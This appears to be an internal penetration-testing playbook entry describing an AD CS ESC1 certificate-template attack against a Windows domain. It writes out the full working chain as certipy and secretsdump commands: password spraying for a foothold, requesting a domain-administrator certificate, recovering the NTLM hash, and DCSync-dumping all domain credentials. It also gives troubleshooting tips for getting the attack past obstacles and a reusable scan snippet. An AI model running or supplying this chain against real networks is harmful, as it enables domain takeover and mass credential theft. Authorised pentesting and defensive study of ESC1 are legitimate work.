# [2026-03] AD CS ESC1 Certificate Template Abuse → Domain Admin

## Scenario Category
Penetration testing / AD attacks

## Target Overview
Through the ESC1-vulnerable template in AD CS, obtain a domain administrator certificate as an ordinary domain user, and finally use DCSync to dump all credentials.

## Complete Execution Chain

1. Get an ordinary domain user's credential (via password spraying)
2. Use certipy to enumerate the AD CS configuration
   ```bash
   certipy find -u user@domain.local -p 'Password123' -dc-ip 10.0.0.1
   ```
3. Discover the ESC1-vulnerable template (allows arbitrary SAN; low-privileged users can request)
4. Request a certificate as the domain administrator
   ```bash
   certipy req -u user@domain.local -p 'Password123' \
     -ca CORP-CA -template VulnTemplate \
     -upn administrator@domain.local -dc-ip 10.0.0.1
   ```
5. Authenticate with the certificate to obtain the NTLM hash
   ```bash
   certipy auth -pfx administrator.pfx -dc-ip 10.0.0.1
   ```
6. DCSync dumps all credentials
   ```bash
   secretsdump.py domain.local/administrator@10.0.0.1 -hashes :NTLM_HASH
   ```

## Pitfall Log

| Problem | Cause | Solution | Time |
|------|------|---------|------|
| certipy find times out | LDAP connection blocked by the firewall | Use the -ns parameter to specify DNS instead | 20min |
| Certificate request refused | The template requires Manager Approval | Switch to another template that does not require approval | 10min |
| auth fails with KDC_ERR_PADATA | DC time out of sync | Sync time with ntpdate and retry | 5min |

## Toolchain Findings
- certipy is the tool of choice for AD CS attacks — more convenient than Certify.exe (pure Python, runs directly on Kali)
- Make sure DNS resolution is correct, otherwise Kerberos authentication will fail

## Key Code/Commands
See the execution chain above.

## Reusable Patterns/Script Snippets
```bash
# One-shot AD CS quick scan
certipy find -u "$USER@$DOMAIN" -p "$PASS" -dc-ip "$DC" -stdout | grep -A5 "ESC"
```

## Improvement Suggestions for This Package
- certipy has been added to the Kali bootstrap manifest ✓
- routing.md already has a "Certipy/AD CS" route ✓

## Evolution Actions
- [x] No update needed (already covered)

## Environment Info
- Kali 2026.1, certipy 4.8.2
- Target: Windows Server 2022, AD CS deployed
- Domain functional level: 2016
